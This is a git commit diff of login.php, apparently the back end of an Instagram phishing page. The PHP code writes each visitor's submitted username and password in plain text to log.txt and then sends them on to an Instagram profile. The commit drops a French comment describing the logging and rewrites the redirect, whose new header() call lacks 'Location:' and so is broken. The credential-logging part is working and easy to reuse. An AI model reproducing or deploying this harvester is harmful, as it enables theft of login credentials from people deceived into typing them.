4194b17b4d19bde24701b59495349286ab7ce81f
TheLinuxProject <64985848+thelinuxproject@users.noreply.github.com>
2020-05-23 12:03:47 +0200

    Update login.php

--- login.php
+++ login.php
@@ -1,9 +1,11 @@
-<?php // Ce script va ouvrir un fichier log.txt, inscrire les données du formulaire et refermer le fichier.
+<?php 
 $fp = fopen ("log.txt", "a");
 fputs($fp, "\n");
 fputs ($fp, "login : ".$_POST['username']);
 fputs ($fp, " / password : ".$_POST['password']);
 fclose ($fp);
-header('Location: https://www.instagram.com/thelinuxproject/?hl=fr');
-exite();
+?>
+<?php 
+header('https://www.instagram.com/thelinuxproject/?hl=fr'); 
+exit;
 ?>
